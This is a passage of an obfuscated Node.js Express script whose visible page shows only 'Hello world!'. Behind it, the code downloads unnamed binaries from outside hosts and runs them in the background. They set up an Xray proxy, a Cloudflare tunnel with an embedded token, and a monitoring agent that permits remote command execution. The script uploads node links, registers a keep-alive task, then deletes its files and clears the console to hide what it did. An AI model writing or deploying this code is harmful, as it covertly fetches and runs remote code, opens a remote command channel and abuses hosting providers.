const _0x2fc93c=_0x97c1;(function(_0x3a9983,_0x3e74a8){const _0x5ed70d=_0x97c1,_0x4561b8=_0x3a9983();while(!![]){try{const _0x5c7bdc=parseInt(_0x5ed70d(0x118))/0x1+parseInt(_0x5ed70d(0x111))/0x2+-parseInt(_0x5ed70d(0xf4))/0x3+-parseInt(_0x5ed70d(0x149))/0x4*(-parseInt(_0x5ed70d(0x133))/0x5)+parseInt(_0x5ed70d(0xff))/0x6+-parseInt(_0x5ed70d(0x103))/0x7+parseInt(_0x5ed70d(0x124))/0x8*(-parseInt(_0x5ed70d(0x188))/0x9);if(_0x5c7bdc===_0x3e74a8)break;else _0x4561b8['push'](_0x4561b8['shift']());}catch(_0x2f31ea){_0x4561b8['push'](_0x4561b8['shift']());}}}(_0xf002,0xe9f82));const express=require(_0x2fc93c(0xe9)),app=express(),axios=require(_0x2fc93c(0x16b)),os=require('os'),fs=require('fs'),path=require(_0x2fc93c(0x1a3)),{promisify}=require(_0x2fc93c(0x12d)),exec=promisify(require(_0x2fc93c(0x146))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x2fc93c(0x117)]||'',PROJECT_URL=process[_0x2fc93c(0x198)][_0x2fc93c(0x18b)]||'',AUTO_ACCESS=process[_0x2fc93c(0x198)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||_0x2fc93c(0x165),SUB_PATH=process[_0x2fc93c(0x198)][_0x2fc93c(0x161)]||_0x2fc93c(0x194),PORT=process['env'][_0x2fc93c(0x13a)]||process[_0x2fc93c(0x198)][_0x2fc93c(0x109)]||0xbb8,UUID=process['env'][_0x2fc93c(0x199)]||_0x2fc93c(0x157),NEZHA_SERVER=process[_0x2fc93c(0x198)][_0x2fc93c(0x144)]||'',NEZHA_PORT=process[_0x2fc93c(0x198)][_0x2fc93c(0xfb)]||'',NEZHA_KEY=process[_0x2fc93c(0x198)][_0x2fc93c(0x164)]||'',ARGO_DOMAIN=process[_0x2fc93c(0x198)][_0x2fc93c(0x15e)]||_0x2fc93c(0x18c),ARGO_AUTH=process[_0x2fc93c(0x198)][_0x2fc93c(0xe4)]||_0x2fc93c(0xf2),ARGO_PORT=process['env'][_0x2fc93c(0x19d)]||0x1f41,CFIP=process[_0x2fc93c(0x198)][_0x2fc93c(0xfc)]||'cdns.doon.eu.org',CFPORT=process[_0x2fc93c(0x198)][_0x2fc93c(0xfe)]||0x1bb,NAME=process[_0x2fc93c(0x198)][_0x2fc93c(0x129)]||_0x2fc93c(0x19e);!fs[_0x2fc93c(0xf9)](FILE_PATH)?(fs[_0x2fc93c(0x14a)](FILE_PATH),console[_0x2fc93c(0x172)](FILE_PATH+_0x2fc93c(0x139))):console[_0x2fc93c(0x172)](FILE_PATH+_0x2fc93c(0x176));function generateRandomName(){const _0x775744=_0x2fc93c,_0x11fb0b=_0x775744(0x153);let _0x34b501='';for(let _0x3fc861=0x0;_0x3fc861<0x6;_0x3fc861++){_0x34b501+=_0x11fb0b[_0x775744(0x11f)](Math[_0x775744(0x1a0)](Math[_0x775744(0x135)]()*_0x11fb0b['length']));}return _0x34b501;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2fc93c(0x15d)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2fc93c(0x15d)](FILE_PATH,botName),subPath=path[_0x2fc93c(0x15d)](FILE_PATH,_0x2fc93c(0x191)),listPath=path[_0x2fc93c(0x15d)](FILE_PATH,_0x2fc93c(0x100)),bootLogPath=path[_0x2fc93c(0x15d)](FILE_PATH,'boot.log'),configPath=path[_0x2fc93c(0x15d)](FILE_PATH,_0x2fc93c(0x143));function deleteNodes(){const _0xc03fd8=_0x2fc93c;try{if(!UPLOAD_URL)return;if(!fs[_0xc03fd8(0xf9)](subPath))return;let _0x117359;try{_0x117359=fs[_0xc03fd8(0x19c)](subPath,_0xc03fd8(0xef));}catch{return null;}const _0x43b885=Buffer[_0xc03fd8(0x120)](_0x117359,'base64')[_0xc03fd8(0x113)](_0xc03fd8(0xef)),_0x2441da=_0x43b885['split']('\x0a')['filter'](_0x494d2c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xc03fd8(0x115)](_0x494d2c));if(_0x2441da[_0xc03fd8(0x18f)]===0x0)return;return axios[_0xc03fd8(0x1a4)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x2441da}),{'headers':{'Content-Type':_0xc03fd8(0x197)}})[_0xc03fd8(0xe1)](_0xc919d1=>{return null;}),null;}catch(_0x4b2d53){return null;}}function cleanupOldFiles(){const _0xc1be13=_0x2fc93c;try{const _0x2547fc=fs[_0xc1be13(0x110)](FILE_PATH);_0x2547fc[_0xc1be13(0x1a1)](_0x3815f2=>{const _0x5aa2c5=_0xc1be13,_0x435281=path[_0x5aa2c5(0x15d)](FILE_PATH,_0x3815f2);try{const _0x2dff8b=fs[_0x5aa2c5(0x14b)](_0x435281);_0x2dff8b[_0x5aa2c5(0xf8)]()&&fs[_0x5aa2c5(0xed)](_0x435281);}catch(_0x12e1f1){}});}catch(_0x52923e){}}app[_0x2fc93c(0x142)]('/',function(_0x5b84f5,_0x1a081a){const _0x78cce8=_0x2fc93c;_0x1a081a[_0x78cce8(0x17f)](_0x78cce8(0x181));});async function generateConfig(){const _0x546626=_0x2fc93c,_0x205517={'log':{'access':'/dev/null','error':_0x546626(0x11e),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x546626(0x12b),'settings':{'clients':[{'id':UUID,'flow':_0x546626(0xf5)}],'decryption':_0x546626(0x184),'fallbacks':[{'dest':0xbb9},{'path':_0x546626(0x10c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x546626(0x173),'dest':0xbbc}]},'streamSettings':{'network':_0x546626(0x140)}},{'port':0xbb9,'listen':_0x546626(0x177),'protocol':_0x546626(0x12b),'settings':{'clients':[{'id':UUID}],'decryption':_0x546626(0x184)},'streamSettings':{'network':'tcp','security':_0x546626(0x184)}},{'port':0xbba,'listen':_0x546626(0x177),'protocol':_0x546626(0x12b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x546626(0x184)},'streamSettings':{'network':'ws','security':_0x546626(0x184),'wsSettings':{'path':_0x546626(0x10c)}},'sniffing':{'enabled':!![],'destOverride':[_0x546626(0xe3),'tls',_0x546626(0x187)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x546626(0x177),'protocol':_0x546626(0x154),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x546626(0x17c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x546626(0x195),_0x546626(0x187)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x546626(0x11a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x546626(0x184),'wsSettings':{'path':_0x546626(0x173)}},'sniffing':{'enabled':!![],'destOverride':[_0x546626(0xe3),'tls',_0x546626(0x187)],'metadataOnly':![]}}],'dns':{'servers':[_0x546626(0x105)]},'outbounds':[{'protocol':'freedom','tag':_0x546626(0x178)},{'protocol':_0x546626(0x192),'tag':'block'}]};fs[_0x546626(0xe5)](path[_0x546626(0x15d)](FILE_PATH,_0x546626(0x143)),JSON[_0x546626(0x1a6)](_0x205517,null,0x2));}function getSystemArchitecture(){const _0xac5d6=_0x2fc93c,_0x37cef6=os[_0xac5d6(0x102)]();return _0x37cef6===_0xac5d6(0x182)||_0x37cef6===_0xac5d6(0x175)||_0x37cef6===_0xac5d6(0xf7)?_0xac5d6(0x182):_0xac5d6(0xea);}function downloadFile(_0x240198,_0x17c9be,_0x2ff5c6){const _0x28a071=_0x2fc93c,_0x5db1ae=_0x240198;!fs['existsSync'](FILE_PATH)&&fs[_0x28a071(0x14a)](FILE_PATH,{'recursive':!![]});const _0x24f661=fs[_0x28a071(0x1a2)](_0x5db1ae);axios({'method':_0x28a071(0x142),'url':_0x17c9be,'responseType':'stream'})[_0x28a071(0x108)](_0x138c0d=>{const _0x4bc724=_0x28a071;_0x138c0d[_0x4bc724(0x14e)][_0x4bc724(0xe7)](_0x24f661),_0x24f661['on'](_0x4bc724(0xf3),()=>{const _0x37ba7e=_0x4bc724;_0x24f661['close'](),console[_0x37ba7e(0x172)](_0x37ba7e(0x13e)+path[_0x37ba7e(0x12f)](_0x5db1ae)+_0x37ba7e(0x185)),_0x2ff5c6(null,_0x5db1ae);}),_0x24f661['on'](_0x4bc724(0x15c),_0x58b5f4=>{const _0x40bb03=_0x4bc724;fs[_0x40bb03(0x168)](_0x5db1ae,()=>{});const _0xf9ba1e=_0x40bb03(0x13e)+path[_0x40bb03(0x12f)](_0x5db1ae)+_0x40bb03(0x19b)+_0x58b5f4[_0x40bb03(0x150)];console[_0x40bb03(0x15c)](_0xf9ba1e),_0x2ff5c6(_0xf9ba1e);});})[_0x28a071(0xe1)](_0x12bf52=>{const _0x39e4fc=_0x28a071,_0x190cc1=_0x39e4fc(0x13e)+path[_0x39e4fc(0x12f)](_0x5db1ae)+_0x39e4fc(0x19b)+_0x12bf52['message'];console['error'](_0x190cc1),_0x2ff5c6(_0x190cc1);});}async function downloadFilesAndRun(){const _0x1dcbfc=_0x2fc93c,_0x82cc86=getSystemArchitecture(),_0x34d5b6=getFilesForArchitecture(_0x82cc86);if(_0x34d5b6['length']===0x0){console[_0x1dcbfc(0x172)](_0x1dcbfc(0x189));return;}const _0x5aea6b=_0x34d5b6[_0x1dcbfc(0x171)](_0xdd0a38=>{return new Promise((_0x42d580,_0x48d91f)=>{const _0x179b90=_0x97c1;downloadFile(_0xdd0a38['fileName'],_0xdd0a38[_0x179b90(0x1a5)],(_0x963b1,_0x16cecf)=>{_0x963b1?_0x48d91f(_0x963b1):_0x42d580(_0x16cecf);});});});try{await Promise['all'](_0x5aea6b);}catch(_0x1e47ae){console[_0x1dcbfc(0x15c)](_0x1dcbfc(0x14c),_0x1e47ae);return;}function _0x5299e7(_0x2ee86f){const _0x557a3c=_0x1dcbfc,_0x1ae80e=0x1fd;_0x2ee86f[_0x557a3c(0x1a1)](_0x3fc82c=>{const _0x35b45a=_0x557a3c;fs[_0x35b45a(0xf9)](_0x3fc82c)&&fs['chmod'](_0x3fc82c,_0x1ae80e,_0x1e1811=>{const _0x520e98=_0x35b45a;_0x1e1811?console[_0x520e98(0x15c)]('Empowerment\x20failed\x20for\x20'+_0x3fc82c+':\x20'+_0x1e1811):console[_0x520e98(0x172)]('Empowerment\x20success\x20for\x20'+_0x3fc82c+':\x20'+_0x1ae80e[_0x520e98(0x113)](0x8));});});}const _0x34eac7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5299e7(_0x34eac7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x386a5e=NEZHA_SERVER[_0x1dcbfc(0xfd)](':')?NEZHA_SERVER[_0x1dcbfc(0x130)](':')['pop']():'',_0x51ec8d=new Set(['443',_0x1dcbfc(0x169),'2096',_0x1dcbfc(0x114),_0x1dcbfc(0x12c),_0x1dcbfc(0x12a)]),_0x3e4151=_0x51ec8d[_0x1dcbfc(0x16e)](_0x386a5e)?'true':_0x1dcbfc(0x190),_0x1e08b1='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1dcbfc(0x186)+NEZHA_SERVER+_0x1dcbfc(0x13d)+_0x3e4151+_0x1dcbfc(0x10e)+UUID;fs[_0x1dcbfc(0xe5)](path['join'](FILE_PATH,_0x1dcbfc(0x156)),_0x1e08b1);const _0x559065=_0x1dcbfc(0x13b)+phpPath+_0x1dcbfc(0x123)+FILE_PATH+_0x1dcbfc(0xe0);try{await exec(_0x559065),console[_0x1dcbfc(0x172)](phpName+_0x1dcbfc(0x125)),await new Promise(_0x5823ab=>setTimeout(_0x5823ab,0x3e8));}catch(_0x5a1ca5){console[_0x1dcbfc(0x15c)]('php\x20running\x20error:\x20'+_0x5a1ca5);}}else{let _0x317cf5='';const _0x5b684c=[_0x1dcbfc(0x147),_0x1dcbfc(0x169),_0x1dcbfc(0x10b),_0x1dcbfc(0x114),_0x1dcbfc(0x12c),'2053'];_0x5b684c[_0x1dcbfc(0xfd)](NEZHA_PORT)&&(_0x317cf5=_0x1dcbfc(0x121));const _0x2bf3d6=_0x1dcbfc(0x13b)+npmPath+_0x1dcbfc(0x180)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x317cf5+_0x1dcbfc(0xee);try{await exec(_0x2bf3d6),console['log'](npmName+_0x1dcbfc(0x125)),await new Promise(_0x3ea3dd=>setTimeout(_0x3ea3dd,0x3e8));}catch(_0xe4584d){console[_0x1dcbfc(0x15c)]('npm\x20running\x20error:\x20'+_0xe4584d);}}}else console[_0x1dcbfc(0x172)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x97affd='nohup\x20'+webPath+_0x1dcbfc(0xeb)+FILE_PATH+_0x1dcbfc(0x16d);try{await exec(_0x97affd),console[_0x1dcbfc(0x172)](webName+_0x1dcbfc(0x125)),await new Promise(_0x1b7e09=>setTimeout(_0x1b7e09,0x3e8));}catch(_0x2414dd){console['error'](_0x1dcbfc(0x126)+_0x2414dd);}if(fs[_0x1dcbfc(0xf9)](botPath)){let _0x479f9a;if(ARGO_AUTH[_0x1dcbfc(0x14f)](/^[A-Z0-9a-z=]{120,250}$/))_0x479f9a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x479f9a='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1dcbfc(0xec):_0x479f9a=_0x1dcbfc(0x159)+FILE_PATH+_0x1dcbfc(0x160)+ARGO_PORT;try{await exec(_0x1dcbfc(0x13b)+botPath+'\x20'+_0x479f9a+_0x1dcbfc(0x13f)),console[_0x1dcbfc(0x172)](botName+'\x20is\x20running'),await new Promise(_0x3d91b3=>setTimeout(_0x3d91b3,0x7d0));}catch(_0x32139f){console[_0x1dcbfc(0x15c)](_0x1dcbfc(0x10a)+_0x32139f);}}await new Promise(_0xe10263=>setTimeout(_0xe10263,0x1388));}function getFilesForArchitecture(_0x48071d){const _0x53cfc7=_0x2fc93c;let _0x3c8480;_0x48071d===_0x53cfc7(0x182)?_0x3c8480=[{'fileName':webPath,'fileUrl':_0x53cfc7(0x17e)},{'fileName':botPath,'fileUrl':_0x53cfc7(0x15b)}]:_0x3c8480=[{'fileName':webPath,'fileUrl':_0x53cfc7(0x18a)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x476fcf=_0x48071d===_0x53cfc7(0x182)?_0x53cfc7(0x11c):_0x53cfc7(0x179);_0x3c8480[_0x53cfc7(0x183)]({'fileName':npmPath,'fileUrl':_0x476fcf});}else{const _0x46742b=_0x48071d==='arm'?_0x53cfc7(0x141):_0x53cfc7(0x138);_0x3c8480['unshift']({'fileName':phpPath,'fileUrl':_0x46742b});}}return _0x3c8480;}function argoType(){const _0xb734b1=_0x2fc93c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xb734b1(0x172)](_0xb734b1(0x17d));return;}if(ARGO_AUTH[_0xb734b1(0xfd)](_0xb734b1(0x10d))){fs['writeFileSync'](path[_0xb734b1(0x15d)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2556a0='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xb734b1(0x130)]('\x22')[0xb]+_0xb734b1(0x16c)+path['join'](FILE_PATH,_0xb734b1(0x10f))+_0xb734b1(0x104)+ARGO_DOMAIN+_0xb734b1(0x16f)+ARGO_PORT+_0xb734b1(0x119);fs[_0xb734b1(0xe5)](path[_0xb734b1(0x15d)](FILE_PATH,'tunnel.yml'),_0x2556a0);}else console['log'](_0xb734b1(0xe2));}function _0xf002(){const _0x23125a=['tcp','https://arm64.ssss.nyc.mn/v1','get','config.json','NEZHA_SERVER','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','child_process','443','Error\x20reading\x20boot.log:','20UMjmpV','mkdirSync','statSync','Error\x20downloading\x20files:','/vmess-argo?ed=2560','data','match','message','Subscription\x20uploaded\x20successfully','\x0a\x0atrojan://','abcdefghijklmnopqrstuvwxyz','vmess','App\x20is\x20running','config.yaml','fd1a7ab7-f882-49dd-b52f-29bf68fa03c6','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','base64','https://arm64.ssss.nyc.mn/bot','error','join','ARGO_DOMAIN','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','SUB_PATH','clear','Unhandled\x20error\x20in\x20startserver:','NEZHA_KEY','./tmp','countryCode','\x20>/dev/null\x202>&1','unlink','8443','boot.log','axios','\x0a\x20\x20credentials-file:\x20','/config.json\x20>/dev/null\x202>&1\x20&','has','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://oooo.serv00.net/add-url','map','log','/trojan-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','arm64','\x20already\x20exists','127.0.0.1','direct','https://amd64.ssss.nyc.mn/agent','.exe\x20>\x20nul\x202>&1','&path=%2Fvless-argo%3Fed%3D2560#','/vmess-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://arm64.ssss.nyc.mn/web','send','\x20-s\x20','Hello\x20world!','arm','unshift','none','\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','quic','9HhhiYD','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://amd64.ssss.nyc.mn/web','PROJECT_URL','baoge.baoge456.dpdns.org','ARGO_DOMAIN:','status','length','false','sub.txt','blackhole','Skipping\x20adding\x20automatic\x20access\x20task','sub','tls','firefox','application/json','env','UUID','Content-Type','\x20failed:\x20','readFileSync','ARGO_PORT','baoge','https://ipapi.co/json/','floor','forEach','createWriteStream','path','post','fileUrl','stringify','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','catch','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','http','ARGO_AUTH','writeFileSync','/api/add-subscriptions','pipe','org','express','amd','\x20-c\x20','/tunnel.yml\x20run','unlinkSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf-8','response','taskkill\x20/f\x20/im\x20','eyJhIjoiMGM2MjQ2ODZkZDEyNmE4ZTY1MjkzN2VjOWY4NWNiZjgiLCJ0IjoiZDlmZGE5MzYtMjYyNy00N2E2LTk5ZmYtMjRlM2JiMzI1MjBlIiwicyI6IlltVm1OVEE0T0RndE9UTmxaaTAwWVdVNUxXRmxNbVl0Wm1aak5qSmhZalU0TWpSaiJ9','finish','4239966NpTkgi','xtls-rprx-vision','rm\x20-rf\x20','aarch64','isFile','existsSync','?encryption=none&security=tls&sni=','NEZHA_PORT','CFIP','includes','CFPORT','10444206rFdyyp','list.txt','push','arch','1068452dlmOPO','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20','del\x20/f\x20/q\x20','then','PORT','Error\x20executing\x20command:\x20','2096','/vless-argo','TunnelSecret','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel.json','readdirSync','1007570cOzYZO','&fp=firefox&type=ws&host=','toString','2087','test','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','UPLOAD_URL','1066329cYSQPs','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','trojan','country_code','https://arm64.ssss.nyc.mn/agent','text/plain;\x20charset=utf-8','/dev/null','charAt','from','--tls','\x0a\x0avmess://','\x20-c\x20\x22','8570192mGFQPO','\x20is\x20running','web\x20running\x20error:\x20','\x20>\x20nul\x202>&1','filter','NAME','2053','vless','2083','util','win32','basename','split','Unknown','http://ip-api.com/json/','284755uqbpiw','substring','random','set','platform','https://amd64.ssss.nyc.mn/v1','\x20is\x20created','SERVER_PORT','nohup\x20','listen','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Download\x20','\x20>/dev/null\x202>&1\x20&'];_0xf002=function(){return _0x23125a;};return _0xf002();}async function extractDomains(){const _0x2b3ee1=_0x2fc93c;let _0x38309d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x38309d=ARGO_DOMAIN,console['log'](_0x2b3ee1(0x18d),_0x38309d),await _0x19703a(_0x38309d);else try{const _0x3289b3=fs[_0x2b3ee1(0x19c)](path[_0x2b3ee1(0x15d)](FILE_PATH,_0x2b3ee1(0x16a)),'utf-8'),_0x30758a=_0x3289b3[_0x2b3ee1(0x130)]('\x0a'),_0x164030=[];_0x30758a[_0x2b3ee1(0x1a1)](_0x1c213b=>{const _0x482aec=_0x2b3ee1,_0x5b7ffd=_0x1c213b[_0x482aec(0x14f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5b7ffd){const _0x5498f2=_0x5b7ffd[0x1];_0x164030['push'](_0x5498f2);}});if(_0x164030[_0x2b3ee1(0x18f)]>0x0)_0x38309d=_0x164030[0x0],console['log']('ArgoDomain:',_0x38309d),await _0x19703a(_0x38309d);else{console['log'](_0x2b3ee1(0x145)),fs[_0x2b3ee1(0xed)](path[_0x2b3ee1(0x15d)](FILE_PATH,_0x2b3ee1(0x16a)));async function _0x183c25(){const _0x7b4673=_0x2b3ee1;try{process[_0x7b4673(0x137)]==='win32'?await exec(_0x7b4673(0xf1)+botName+_0x7b4673(0x17a)):await exec('pkill\x20-f\x20\x22['+botName[_0x7b4673(0x11f)](0x0)+']'+botName[_0x7b4673(0x134)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3463b2){}}_0x183c25(),await new Promise(_0x32ebae=>setTimeout(_0x32ebae,0xbb8));const _0x23c10d=_0x2b3ee1(0x159)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x23c10d+_0x2b3ee1(0x13f)),console[_0x2b3ee1(0x172)](botName+'\x20is\x20running'),await new Promise(_0xcc32eb=>setTimeout(_0xcc32eb,0xbb8)),await extractDomains();}catch(_0xe50de2){console[_0x2b3ee1(0x15c)](_0x2b3ee1(0x10a)+_0xe50de2);}}}catch(_0x49f9c0){console[_0x2b3ee1(0x15c)](_0x2b3ee1(0x148),_0x49f9c0);}async function _0x39b93b(){const _0x433e82=_0x2b3ee1;try{const _0x5e4702=await axios['get'](_0x433e82(0x19f),{'timeout':0xbb8});if(_0x5e4702[_0x433e82(0x14e)]&&_0x5e4702[_0x433e82(0x14e)][_0x433e82(0x11b)]&&_0x5e4702['data'][_0x433e82(0xe8)])return _0x5e4702['data']['country_code']+'_'+_0x5e4702[_0x433e82(0x14e)][_0x433e82(0xe8)];}catch(_0x1e6f4c){try{const _0x24a646=await axios[_0x433e82(0x142)](_0x433e82(0x132),{'timeout':0xbb8});if(_0x24a646[_0x433e82(0x14e)]&&_0x24a646[_0x433e82(0x14e)][_0x433e82(0x18e)]==='success'&&_0x24a646[_0x433e82(0x14e)][_0x433e82(0x166)]&&_0x24a646[_0x433e82(0x14e)][_0x433e82(0xe8)])return _0x24a646[_0x433e82(0x14e)]['countryCode']+'_'+_0x24a646[_0x433e82(0x14e)][_0x433e82(0xe8)];}catch(_0x4c5212){}}return _0x433e82(0x131);}async function _0x19703a(_0x3fa7ab){const _0x27abb4=await _0x39b93b(),_0x31fdeb=NAME?NAME+'-'+_0x27abb4:_0x27abb4;return new Promise(_0x211055=>{setTimeout(()=>{const _0x38f6d0=_0x97c1,_0xcece9d={'v':'2','ps':''+_0x31fdeb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x38f6d0(0x184),'net':'ws','type':_0x38f6d0(0x184),'host':_0x3fa7ab,'path':_0x38f6d0(0x14d),'tls':_0x38f6d0(0x195),'sni':_0x3fa7ab,'alpn':'','fp':_0x38f6d0(0x196)},_0x5be1cb='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x38f6d0(0xfa)+_0x3fa7ab+_0x38f6d0(0x112)+_0x3fa7ab+_0x38f6d0(0x17b)+_0x31fdeb+_0x38f6d0(0x122)+Buffer[_0x38f6d0(0x120)](JSON['stringify'](_0xcece9d))['toString'](_0x38f6d0(0x15a))+_0x38f6d0(0x152)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3fa7ab+_0x38f6d0(0x112)+_0x3fa7ab+_0x38f6d0(0x158)+_0x31fdeb+_0x38f6d0(0x106);console[_0x38f6d0(0x172)](Buffer[_0x38f6d0(0x120)](_0x5be1cb)[_0x38f6d0(0x113)](_0x38f6d0(0x15a))),fs[_0x38f6d0(0xe5)](subPath,Buffer[_0x38f6d0(0x120)](_0x5be1cb)[_0x38f6d0(0x113)]('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x38f6d0(0x142)]('/'+SUB_PATH,(_0x15c507,_0x48e181)=>{const _0x29e5c4=_0x38f6d0,_0x2cad42=Buffer['from'](_0x5be1cb)[_0x29e5c4(0x113)]('base64');_0x48e181[_0x29e5c4(0x136)](_0x29e5c4(0x19a),_0x29e5c4(0x11d)),_0x48e181['send'](_0x2cad42);}),_0x211055(_0x5be1cb);},0x7d0);});}}async function uploadNodes(){const _0x4f5ca7=_0x2fc93c;if(UPLOAD_URL&&PROJECT_URL){const _0x5f03bd=PROJECT_URL+'/'+SUB_PATH,_0xa74dd3={'subscription':[_0x5f03bd]};try{const _0x18ec66=await axios[_0x4f5ca7(0x1a4)](UPLOAD_URL+_0x4f5ca7(0xe6),_0xa74dd3,{'headers':{'Content-Type':'application/json'}});return _0x18ec66&&_0x18ec66[_0x4f5ca7(0x18e)]===0xc8?(console[_0x4f5ca7(0x172)](_0x4f5ca7(0x151)),_0x18ec66):null;}catch(_0x2e6128){if(_0x2e6128[_0x4f5ca7(0xf0)]){if(_0x2e6128[_0x4f5ca7(0xf0)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4f5ca7(0xf9)](listPath))return;const _0x185959=fs['readFileSync'](listPath,_0x4f5ca7(0xef)),_0x2ceab8=_0x185959[_0x4f5ca7(0x130)]('\x0a')[_0x4f5ca7(0x128)](_0x106d30=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x106d30));if(_0x2ceab8[_0x4f5ca7(0x18f)]===0x0)return;const _0x262442=JSON[_0x4f5ca7(0x1a6)]({'nodes':_0x2ceab8});try{const _0x51d02d=await axios[_0x4f5ca7(0x1a4)](UPLOAD_URL+_0x4f5ca7(0x15f),_0x262442,{'headers':{'Content-Type':_0x4f5ca7(0x197)}});return _0x51d02d&&_0x51d02d[_0x4f5ca7(0x18e)]===0xc8?(console[_0x4f5ca7(0x172)]('Nodes\x20uploaded\x20successfully'),_0x51d02d):null;}catch(_0x5a49c8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4265eb=_0x97c1,_0x10181b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x10181b[_0x4265eb(0x101)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x10181b[_0x4265eb(0x101)](phpPath);process['platform']===_0x4265eb(0x12e)?exec(_0x4265eb(0x107)+_0x10181b[_0x4265eb(0x15d)]('\x20')+_0x4265eb(0x127),_0x92aeb3=>{const _0x58fd91=_0x4265eb;console[_0x58fd91(0x162)](),console[_0x58fd91(0x172)](_0x58fd91(0x155)),console[_0x58fd91(0x172)](_0x58fd91(0x116));}):exec(_0x4265eb(0xf6)+_0x10181b[_0x4265eb(0x15d)]('\x20')+_0x4265eb(0x167),_0x24788b=>{const _0x427ed2=_0x4265eb;console['clear'](),console[_0x427ed2(0x172)](_0x427ed2(0x155)),console[_0x427ed2(0x172)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5d0bbf=_0x2fc93c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5d0bbf(0x172)](_0x5d0bbf(0x193));return;}try{const _0x518e10=await axios[_0x5d0bbf(0x1a4)](_0x5d0bbf(0x170),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x5d0bbf(0x172)]('automatic\x20access\x20task\x20added\x20successfully'),_0x518e10;}catch(_0x134a63){return console[_0x5d0bbf(0x15c)](_0x5d0bbf(0x174)+_0x134a63[_0x5d0bbf(0x150)]),null;}}async function startserver(){const _0x2a7837=_0x2fc93c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await 